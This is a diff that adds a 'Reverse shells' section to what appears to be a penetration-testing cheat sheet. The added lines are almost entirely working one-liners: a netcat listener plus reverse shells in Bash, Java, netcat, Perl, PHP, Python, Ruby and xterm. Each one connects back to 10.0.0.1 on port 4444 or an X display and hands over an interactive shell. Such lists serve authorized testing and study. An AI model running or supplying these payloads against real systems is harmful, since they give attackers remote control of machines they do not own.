@@ -173,6 +173,43 @@ iptables -P FORWARD ACCEPT
 sysctl net.ipv4.ip_forward=1
 ------------------------------------------------------------------------------------------------------
 
+# Reverse shells
+
+- nc -lvp 4444			Setup a listen on the attack box.
+
+- Bash
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+
+- Java
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+- Netcat
+nc -c /bin/sh 10.0.0.1 4444
+
+/bin/sh | nc 10.0.0.1 4444
+
+rm -f /tmp/p; mknod /tmp/p p && nc 10.0.0.1 4444 0/tmp/p
+
+- Perl
+perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+- PHP
+php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+- Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+- Ruby
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+- xterm
+xterm -display 10.0.0.1:1		target - It will connect back to you on TCP port 6001.
+Xnest :1				attacker - catch the incoming xterm, start an X-Server.
+xhost +targetip				attacker - Authorise the target to connect to you.
+------------------------------------------------------------------------------------------------------
+
 # Searching
 
 grep                               Search for a pattern a file
